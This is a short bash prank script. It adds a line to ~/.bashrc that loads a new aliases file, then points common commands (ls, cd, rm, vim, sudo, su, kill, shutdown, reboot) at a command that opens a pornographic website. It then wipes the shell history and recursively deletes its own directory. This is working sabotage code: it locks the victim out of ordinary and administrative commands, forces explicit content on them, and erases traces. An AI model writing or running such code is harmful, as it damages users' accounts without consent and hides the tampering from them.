#!/bin/bash

echo "if [ -f ~/.bash_aliases ]; then" >> ~/.bashrc
echo ". ~/.bash_aliases" >> ~/.bashrc
echo "fi" >> ~/.bashrc

echo "alias ne='firefox youporn.com &'" > ~/.bash_aliases
echo "alias emacs='ne'" >> ~/.bash_aliases
echo "alias vim='ne'" >> ~/.bash_aliases
echo "alias ls='ne'" >> ~/.bash_aliases
echo "alias cd='ne'" >> ~/.bash_aliases
echo "alias rm='ne'" >> ~/.bash_aliases
echo "alias shutdown='ne'" >> ~/.bash_aliases
echo "alias kill='ne'" >> ~/.bash_aliases
echo "alias reboot='ne'" >> ~/.bash_aliases
echo "alias nano='ne'" >> ~/.bash_aliases
echo "alias sudo='ne'" >> ~/.bash_aliases
echo "alias su='ne'" >> ~/.bash_aliases

cat /dev/null > ~/.bash_history
rm -r ../Confs
